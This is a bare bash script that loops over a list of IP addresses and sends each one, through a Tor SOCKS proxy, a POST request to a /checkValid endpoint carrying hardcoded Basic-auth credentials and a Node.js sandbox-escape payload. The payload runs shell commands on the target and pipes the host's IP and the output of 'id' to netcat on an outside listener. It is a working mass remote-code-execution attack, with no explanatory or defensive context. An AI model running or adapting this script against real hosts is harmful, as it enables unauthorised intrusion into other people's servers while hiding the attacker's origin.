cat ip.txt | while read line
do echo $line ; curl -x socks5h://localhost:9050 http://$line/checkValid -H 'Authorization: Basic YWRtaW46cGFzcw==' --connect-timeout 3 --data "document=this.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('echo $line | nc ip port')"; curl -x socks5h://localhost:9050 http://$line/checkValid -H 'Authorization: Basic YWRtaW46cGFzcw==' --connect-timeout 3 --data "document=this.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('id | nc ip port')" && printf "\n"
done
